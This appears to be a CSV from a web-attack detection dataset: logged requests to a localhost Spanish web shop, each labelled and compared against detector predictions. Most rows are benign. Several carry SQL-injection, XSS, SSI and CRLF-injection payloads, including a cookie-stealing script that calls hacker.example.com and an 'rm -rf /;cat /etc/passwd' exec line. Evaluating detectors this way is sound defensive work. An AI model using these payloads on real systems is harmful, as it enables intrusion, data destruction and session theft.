,URL,Target,y_match,y_pred,WAffle
270,http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Vino+Rioja&precio=39&cantidad=66&B1=A%F1adir+al+carrito,0,0,0,0
271,http://localhost:8080/tienda1/miembros/fotos.jsp,0,0,0,0
272,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=horalek&password=flota5iento&nombre=Babilas&apellidos=Gibert+Mallorqu%EDn&email=israel_piggot%40joyclub.pe&dni=92173990H&direccion=Nuestra+Se%F1ora+De+La+Paz%2C+86%2C+2%3FA&ciudad=Magaz+de+Pisuerga&cp=09620&provincia=Zamora&ntc=1025489401142113&B1=Registrar,0,0,0,0
273,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=hazell&pwd=clam%21o&remember=on&B1=Entrar,0,0,0,0
274,http://localhost:8080/tienda1/publico/miembros.jsp,0,0,0,0
275,http://localhost:8080/CFIDE/administrator/enter.cfm,1,0,1,1
276,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=soules&password=acomplexionada&nombre=Rigby&apellidos=Pascuet+Landivar&email=moskuna%40sitcpla.ye&dni=45053569L&direccion=Duende%2C+138%2C+&ciudad=Guingueta+d%27%C0neu%2C+La&cp=40170&provincia=Huesca&ntc=0029687955884916&B1=Registrar,0,0,0,0
277,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=joffe&pwd=A6R91n4&remember=on&B1=Entrar,0,0,0,0
278,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas,0,0,0,0
279,http://localhost:8080/tienda1/imagenes/1.gif,0,0,0,0
280,http://localhost:8080/tienda1/imagenes/1.gif,0,0,0,0
281,http://localhost:8080/tienda1/miembros/salir.jsp,0,0,0,0
282,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=252&B1=Confirmar%2F,1,0,1,1
283,http://localhost:8080/tienda1/publico/registro.jsp,1,0,1,1
284,http://localhost:8080/tienda1/miembros/editar.jsp,1,0,1,1
285,http://localhost:8080/tienda1/publico/autenticar.jsp,1,0,1,1
286,http://localhost:8080/tienda1/publico/caracteristicas.jsp,1,0,1,1
287,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas,0,0,0,0
288,http://localhost:8080/tienda1/global/creditos.jsp,0,0,0,0
289,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4641&B1A=Confirmar,1,0,1,1
290,http://localhost:8080/tienda1/global/titulo.jsp,0,0,0,0
291,http://localhost:8080/tienda1/miembros/salir.jsp,0,0,0,0
292,http://localhost:8080/tienda1/publico/vaciar.jsp,1,0,1,1
293,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=goei&passwordA=solemnemente&nombre=Juvencio&apellidos=Sebastan+Bastida&email=luu-tupou%40eddydaniele.bj&dni=77050984H&direccion=Avinguda+Lluis+Companys%2C+144+3-D&ciudad=Mu%F1osancho&cp=37871&provincia=Valencia&ntc=4809346017466536&B1=Registrar,1,0,1,1
294,http://localhost:8080/tienda1/miembros/editar.jsp,1,0,1,1
295,http://localhost:8080/CFIDE/administrator/welcomefooter.cfm,1,0,1,1
296,http://localhost:8080/tienda1/publico/registro.jsp,1,0,1,1
297,http://localhost:8080/tienda1/imagenes/cmenbul.gif,0,0,0,0
298,http://localhost:8080/tienda1/imagenes/logo.gif,0,0,0,0
299,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito,0,0,0,0
300,http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=2,1,0,1,1
301,http://localhost:8080/tienda1/publico/autenticar.jsp,1,0,1,1
302,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas,0,0,0,0
303,http://localhost:8080/tienda1/global/titulo.jsp,0,0,0,0
304,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1,0,0,0,0
305,http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg,0,0,0,0
306,http://localhost:8080/tienda1/publico/autenticar.jsp,1,0,1,1
307,http://localhost:8080/tienda1/publico/pagar.jsp,1,0,1,1
308,http://localhost:8080/tienda1/publico/pagar.jsp,0,0,1,1
309,http://localhost:8080/tienda1/publico/carrito.jsp,0,0,0,0
310,http://localhost:8080/tienda1/publico/vaciar.jsp.old,1,0,1,1
311,http://localhost:8080/tienda1/publico/autenticar.jsp,1,0,1,1
312,http://localhost:8080/tienda1/imagenes/2.gif,0,0,0,0
313,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=dempsey&password=cABALlaZo&nombre=Atila&apellidos=%27+AND+%271%27%3D%271&email=pristo%40auditar.com.mr&dni=93515707F&direccion=C%2F+Marti+Alegre+179+6%3FF&ciudad=Quart+de+les+Valls&cp=27143&provincia=Teruel&ntc=4795657377171700&B1=Registrar,1,0,1,1
314,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,1,0,1,1
315,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=hately6&pwd=luJURiosaMente&remember=on&B1A=Entrar,1,0,1,1
316,http://localhost:8080/tienda1/miembros/fotos.jsp,0,0,0,0
317,http://localhost:8080/tienda1/miembros.INC,1,0,1,1
318,http://localhost:8080/tienda1/global/estilos.css,0,0,0,0
319,http://localhost:8080/tienda1/publico/miembros.jsp,0,0,0,0
320,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8166&B1=Pasar+por+caja,0,0,0,0
321,http://localhost:8080/tienda1/imagenes/3.gif,0,0,0,0
322,http://localhost:8080/tienda1/publico/anadir.jsp,1,0,1,1
323,http://localhost:8080/tienda1/publico/miembros.jsp,0,0,0,0
324,http://localhost:8080/tienda1/publico/autenticar.jsp,1,0,1,1
325,http://localhost:8080/tienda1.old,1,0,1,1
326,http://localhost:8080/tienda1/publico/autenticar.jsp,0,0,1,1
327,http://localhost:8080/tienda1/global/estilos.css.OLD,1,0,1,1
328,http://localhost:8080/tienda1/publico/anadir.jsp,1,0,1,1
329,http://localhost:8080/tienda1.Inc,1,0,1,1
330,http://localhost:8080/tienda1/publico/caracteristicas.jsp,1,0,1,1
331,http://localhost:8080/tienda1/publico/pagar.jsp?modo=%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&precio=622&B1=Pasar+por+caja,1,0,1,1
332,http://localhost:8080/tienda1/publico/miembros.jsp,0,0,0,0
333,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=foster&pwd=8se7i961o&rememberA=off&B1=Entrar,1,0,1,1
334,http://localhost:8080/tienda1/miembros/salir.jsp,0,0,0,0
335,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=procacci&password=a65esad0&nombre=Efr%E9n&apellidos=Conde&email=matterstock%409horas.np&dni=66866648J&direccion=Calle+Casta%F1os+90+&ciudad=Torre-Cardela&cp=25330&provincia=Guadalajara&ntc=4867284155125635&B1=Registrar,0,0,0,0
336,http://localhost:8080/tienda1/publico/vaciar.jsp,1,0,1,1
337,http://localhost:8080/tienda1/publico/entrar.jsp,0,0,1,1
338,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito,0,0,0,0
339,http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=11&B1=A%F1adir+al+carrito,0,0,0,0
340,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8145&B1=Pasar+por+caja%2F,1,0,1,1
341,http://localhost:8080/reports.nsf,1,0,1,1
342,http://localhost:8080/tienda1/global/estilos.css,0,0,0,0
343,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=kurio&pwd=lug5r&remember=on&B1=Entrar,0,0,0,0
344,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2,0,0,0,0
345,http://localhost:8080/tienda1/imagenes/nuestratierra.jpg,0,0,0,0
346,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas,0,0,0,0
347,http://localhost:8080/tienda1/index.jsp,0,0,0,0
348,http://localhost:8080/tienda1/publico/autenticar.jsp,1,0,1,1
349,http://localhost:8080/tienda1/publico/vaciar.jsp,1,0,1,1
350,http://localhost:8080/tienda1/publico/pagar.jsp,1,0,1,1
351,http://localhost:8080/asf-logo-wide.gif/,1,0,1,1
352,http://localhost:8080/tienda1/imagenes/1.gif,0,0,0,0
353,http://localhost:8080/tienda1/imagenes/nuestratierra.jpg,0,0,0,0
354,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito,0,0,0,0
355,http://localhost:8080/tienda1/publico/vaciar.jsp/asf-logo-wide.gif.inc,1,0,1,1
356,http://localhost:8080/tienda1/publico/miembros.jsp,0,0,0,0
357,http://localhost:8080/tienda1/imagenes/2.gif.old,1,0,1,1
358,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=%27INJECTED_PARAM&pwd=reparaci%F3n&remember=off&B1=Entrar,1,0,1,1
359,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas,1,0,1,1
360,http://localhost:8080/tienda1/publico/pagar.jsp,1,0,1,1
361,http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg,0,0,0,0
362,http://localhost:8080/tienda1/publico/caracteristicas.jsp,1,0,1,1
363,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=clarita&password=2e720lOn7r&nombre=Quirico&apellidos=Mart%EDnez&email=goodier_igus%40catanoticias.sd&dni=37035771K&direccionA=Avenida+Casado+Del+Alisal%2C+70+&ciudad=Santa+Eulalia+Bajera&cp=42311&provincia=Tarragona&ntc=9017290902673113&B1=Registrar,1,0,1,1
364,http://localhost:8080/tienda1/miembros/imagenes/castro.jpg,0,0,0,0
365,http://localhost:8080/tienda1/miembros/editar.jsp,0,0,1,1
366,http://localhost:8080/tienda1/publico/autenticar.jsp,0,0,1,1
367,http://localhost:8080/tienda1/publico/registro.jsp,1,0,1,1
368,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas,0,0,0,0
369,http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg,0,0,0,0
370,http://localhost:8080/tienda1/publico/productos.jsp,0,0,0,0
371,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E,1,1,1,1
372,http://localhost:8080/tienda1/publico/vaciar.jsp,0,0,1,1
373,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=paquito&password=despernada&nombre=Zoel&apellidos=Mulleras+Picornel&email=carrillo-whitson%40mobilecrm.fj&dni=98918059G&direccion=Avda.+Juan+Carlos+i%2C+195%2C+6F&ciudad=Mu%F1opedro&cp=46824&provincia=Palencia&ntc=9127471588357421&B1=Registrar,0,0,0,0
374,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4645&B1=Confirmar,0,0,0,0
375,http://localhost:8080/tienda1/miembros/salir.jsp,0,0,0,0
376,http://localhost:8080/tienda1/miembros/editar.jsp,1,0,1,1
377,http://localhost:8080/tienda1/publico/entrar.jsp.inc,1,0,1,1
378,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas,0,0,0,0
379,http://localhost:8080/4861362529278789730,1,0,1,1
380,http://localhost:8080/tienda1/imagenes/1.gif,0,0,0,0
381,http://localhost:8080/tienda1/publico/anadir.jsp,0,0,1,1
382,http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Queso+Manchego%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&precio=39&cantidad=59&B1=A%F1adir+al+carrito,1,0,1,1
383,http://localhost:8080/tienda1/publico/pagar.jsp,0,0,1,1
384,http://localhost:8080/tienda1/miembros/fotos.jsp,0,0,0,0
385,http://localhost:8080/tienda1/publico/entrar.jsp,0,0,1,1
386,http://localhost:8080/tienda1/publico/registro.jsp,1,0,1,1
387,http://localhost:8080/tienda1/publico/miembros.jsp,0,0,0,0
388,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas,0,0,0,0
389,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=draves&password=ro%F1IcA&nombre=Babeli&apellidosA=Hermoso+Ginart&email=haver0%40iurispretor.cn&dni=77284339S&direccion=Calle+Urbina%2C+129+&ciudad=Berango&cp=33775&provincia=Le%F3n&ntc=7007903703917778&B1=Registrar,1,0,1,1
390,http://localhost:8080/tienda1/publico/autenticar.jsp,1,0,1,1
391,http://localhost:8080/tienda1/publico/pagar.jsp,0,0,1,1
392,http://localhost:8080/tienda1/miembros/fotos.jsp,0,0,0,0
393,http://localhost:8080/tienda1/publico/miembros.jsp,0,0,0,0
394,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=any%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235,1,0,1,1
395,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito,0,0,0,0
396,http://localhost:8080/tienda1/publico/registro.jsp,1,0,1,1
397,http://localhost:8080/tienda1/miembros/fotos.jsp/6909030637832563290.jsp.old,1,0,1,1
398,http://localhost:8080/tienda1/miembros/editar.jsp,0,0,1,1
399,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=rivalee&password=en7repa2ECERsE&nombre=Natal%ED&apellidos=Els%E4sser+Gula&email=jannings_corrigan%40castigadas.gm&dni=41719663D&direccion=Deimos+147+12%3FA&ciudad=Mont%E1nchez&cp=26540&provincia=%C1vila&ntc=8319713871546470&B1=Registrar,0,0,1,1
400,http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Queso+Manchego&precio=85&cantidad=54%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&B1=A%F1adir+al+carrito,1,0,1,1
401,http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito,1,0,1,1
402,http://localhost:8080/tienda1/imagenes/2.gif,0,0,0,0
403,http://localhost:8080/tienda1/publico/registro.jsp,1,0,1,1
404,http://localhost:8080/tienda1/miembros/editar.jsp,0,0,1,1
405,http://localhost:8080/tienda1/publico/entrar.jsp,0,0,1,1
406,http://localhost:8080/tienda1/miembros/fotos.jsp,0,0,0,0
407,http://localhost:8080/tienda1/imagenes/3.gif,0,0,0,0
408,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito,0,0,0,0
409,http://localhost:8080/tienda1/imagenes/nuestratierra.jpg,0,0,0,0
410,http://localhost:8080/tienda1/imagenes/nuestratierra.jpg,0,0,0,0
411,http://localhost:8080/tienda1/6909030637832563290.jsp.old,1,0,1,1
412,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=cushing&pwd=614n3r9&remember=off&B1=%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E,1,1,1,1
413,http://localhost:8080/iisadmpwd/aexp.htr,1,0,1,1
414,http://localhost:8080/tienda1/publico/vaciar.jsp,1,0,1,1
415,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=teriann&password=bim42or&nombre=Archibaldo&apellidos=Villavecchia+Bernal&email=seidler.pedro%40investopi.bt&dni=69492946X&direccion=C%2F+Isabel+Ii+151%2C+2B&ciudad=Vilamalla&cp=09450&provincia=Zamora&ntc=6106115865632521AND+1%3D1&B1=Registrar,1,0,1,1
416,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas,0,0,0,0
417,http://localhost:8080/tienda1/publico/registro.jsp,1,0,1,1
418,http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=2,1,0,1,1
419,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=3748&B1=Confirmar%2F,1,0,1,1
420,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito,0,0,0,0
421,http://localhost:8080/tienda1/index.jsp,0,0,0,0
422,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E,1,1,1,1
423,http://localhost:8080/tienda1/global/creditos.jsp,0,0,0,0
424,http://localhost:8080/tienda1/miembros/editar.jsp,0,0,1,1
425,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito,0,0,0,0
426,http://localhost:8080/tienda1/publico/pagar.jsp,0,0,1,1
427,http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg,0,0,0,0
428,http://localhost:8080/tienda1/publico/registro.jsp/asf-logo-wide.gif/.bak,1,0,1,1
429,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=lyliston&pwd=de4454&remember=off%2F&B1=Entrar,1,0,1,1
430,http://localhost:8080/tienda1/publico/carrito.jsp,0,0,0,0
431,http://localhost:8080/tienda1/miembros/imagenes/castro.jpg,0,0,0,0
432,http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg,0,0,0,0
433,http://localhost:8080/tienda1/publico/anadir.jsp?id=Set-cookie%253A%2BTamper%253D1041264011025374727&nombre=Queso+Manchego&precio=39&cantidad=98&B1=A%F1adir+al+carrito,1,0,1,1
434,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E,1,0,1,1
435,http://localhost:8080/tienda1/miembros/editar.jsp,1,0,1,1
436,http://localhost:8080/tienda1/publico/entrar.jsp,0,0,1,1
437,http://localhost:8080/tienda1/index.jsp,0,0,0,0
438,http://localhost:8080/tienda1/publico/entrar.jsp,1,0,1,1
439,http://localhost:8080/tienda1/miembros/index.jsp,0,0,0,0
440,http://localhost:8080/tienda1/publico/vaciar.jsp,0,0,1,1
441,http://localhost:8080/tienda1/publico/vaciar.jsp,0,0,1,1
442,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=virge&password=93sci06i745o&nombre=Hemilce&apellidos=Bulay+Vallejo&email=pettingill%40demasiado.com.bv&dni=41910864B&direccion=Calle+Panama%2C+72+8-B&ciudad=Hu%E9rcal-Overa&cp=16300&provincia=Las+Palmas&ntc=1136300423547186&B1=Registrar,0,0,0,0
443,http://localhost:8080/tienda1/publico/registro.jsp,0,0,1,1
444,http://localhost:8080/tienda1/publico/anadir.jsp?idA=3&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=90&B1=A%F1adir+al+carrito,1,0,1,1
445,http://localhost:8080/tienda1/imagenes/3.gif,0,0,0,0
446,http://localhost:8080/tienda1/publico/anadir.jsp,1,0,1,1
447,http://localhost:8080/tienda1/publico/carrito.jsp,0,0,0,0
448,http://localhost:8080/.INC,1,0,1,1
449,http://localhost:8080/samples/dbsamp/dbsamp1.htm,1,0,1,1
450,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas,0,0,0,0
451,http://localhost:8080/tienda1/publico/anadir.jsp?idA=3&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=73&B1=A%F1adir+al+carrito,1,0,1,1
452,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=follett&pwd=De21&remember=off&B1=Entrar,0,0,0,0
453,http://localhost:8080/tienda1/imagenes/1.gif,0,0,0,0
454,http://localhost:8080/tienda1/imagenes/3.gif,0,0,0,0
455,http://localhost:8080/tienda1/miembros/editar.jsp,0,0,1,1
456,http://localhost:8080/tienda1/imagenes/nuestratierra.jpg,0,0,0,0
457,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas,0,0,0,0
458,http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg,0,0,0,0
459,http://localhost:8080/tienda1/global/menum.jsp,0,0,0,0
460,http://localhost:8080/webapp/examples/HitCount,1,0,1,1
461,http://localhost:8080/tienda1.BAK,1,0,1,1
462,http://localhost:8080/tienda1/publico/caracteristicas.jsp,0,0,1,1
463,http://localhost:8080/tienda1/imagenes/2.gif,0,0,0,0
464,http://localhost:8080/tienda1/publico/pagar.jsp?modo=%27+DELETE+FROM+USERS&precio=5521&B1=Pasar+por+caja,1,0,1,1
465,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas,0,0,0,0
466,http://localhost:8080/tienda1/publico/pagar.jsp,1,0,1,1
467,http://localhost:8080/tienda1/publico/registro.jsp,1,0,1,1
468,http://localhost:8080/tienda1/publico/vaciar.jsp,0,0,1,1
469,http://localhost:8080/tienda1/imagenes/cmenbul.gif,0,0,0,0
470,http://localhost:8080/tienda1/publico/registro.jsp,1,0,1,1
471,http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Queso+Manchego&precio=100&cantidad=66&B1A=A%F1adir+al+carrito,1,0,1,1
472,http://localhost:8080/tienda1/publico/registro.jsp,0,0,1,1
473,http://localhost:8080/tienda1/miembros/salir.jsp/asf-logo-wide.old,1,0,1,1
474,http://localhost:8080/tienda1/publico/autenticar.jsp,0,0,1,1
475,http://localhost:8080/tienda1/imagenes/1.gif,0,0,0,0
476,http://localhost:8080/tienda1/publico/miembros.jsp/asf-logo-wide,1,0,1,1
477,http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=100&cantidad=83&B1=A%F1adir+al+carrito,0,0,0,0
478,http://localhost:8080/tienda1/miembros/editar.jsp,1,0,1,1
479,http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Vino+Rioja&precio=39&cantidadA=69&B1=A%F1adir+al+carrito,1,0,1,1
480,http://localhost:8080/tienda1/publico/productos.jsp,0,0,0,0
481,http://localhost:8080/tienda1/publico/anadir.jsp,1,0,1,1
482,http://localhost:8080/tienda1/imagenes/logo.gif,0,0,0,0
483,http://localhost:8080/tienda1/publico/productos.jsp,0,0,0,0
484,http://localhost:8080/tienda1/imagenes/3.gif,0,0,0,0
485,http://localhost:8080/tienda1/publico/vaciar.jsp,0,0,1,1
486,http://localhost:8080/tienda1/global/estilos.css,0,0,0,0
487,http://localhost:8080/tienda1/imagenes/nuestratierra.jpg,0,0,0,0
488,http://localhost:8080/asf-logo-wide.inc,1,0,1,1
489,http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg,0,0,0,0
490,http://localhost:8080/tienda1/publico/vaciar.jsp,0,0,1,1
491,http://localhost:8080/tienda1/publico/pagar.jsp,1,0,1,1
492,http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=85&cantidad=55&B1=A%F1adir+al+carrito,0,0,0,0
493,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas,1,0,1,1
494,http://localhost:8080/tienda1/publico/caracteristicas.jsp,1,0,1,1
495,http://localhost:8080/tienda1/publico/anadir.jsp,1,0,1,1
496,http://localhost:8080/tienda1/publico/pagar.jsp,1,0,1,1
497,http://localhost:8080/mtatbls.nsf,1,0,1,1
498,http://localhost:8080/tienda1/publico/miembros.jsp,0,0,0,0
499,http://localhost:8080/tienda1/publico/entrar.jsp,0,0,1,1
500,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2,0,0,0,0
501,http://localhost:8080/tienda1/global/estilos.css,0,0,0,0
502,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=amlani&password=c4oat5&nombre=Clodomiro&apellidos=Muntan%E9+Pros&email=solter%40aclub.com.ke&dni=81470918L&direccion=Estret+De+Sant+Nicolau+S%2FN+&ciudad=Begur&cp=03400&provincia=Burgos&ntc=1563947873431208&B1=Registrar,0,0,0,0
503,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito,0,0,0,0
504,http://localhost:8080/tienda1/imagenes/nuestratierra.jpg,0,0,0,0
505,http://localhost:8080/tienda1/miembros/editar.jsp,1,0,1,1
506,http://localhost:8080/tienda1/imagenes/2.gif,0,0,0,0
